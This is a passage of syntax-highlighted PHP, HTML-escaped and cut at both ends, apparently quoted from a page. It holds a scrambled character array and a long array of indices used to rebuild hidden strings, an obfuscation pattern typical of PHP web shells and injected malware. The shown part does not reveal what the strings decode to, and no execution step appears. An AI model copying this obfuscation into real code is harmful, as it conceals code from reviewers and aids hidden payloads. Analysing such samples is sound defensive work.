#2AA198&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;F&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;6&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;b&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;L&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;^&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;,&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;l&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;$&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;`&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;%&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;N&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;[&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;}&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;J&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;-&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;5&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;_&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;=&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;{&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;k&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;o&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;7&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;#&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;i&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;I&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Y&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;(&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;j&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;?&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;K&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;B&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;R&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;4&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;8&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;e&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;|&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;$order&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=array&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;59&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;71&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;35&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;76&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;76&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;30&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;68&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;83&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;43&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;38&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;58&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;83&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;43&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;60&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;83&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;48&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;37&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;50&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;90&lt;/span&gt;&lt;span style=&#34;color: 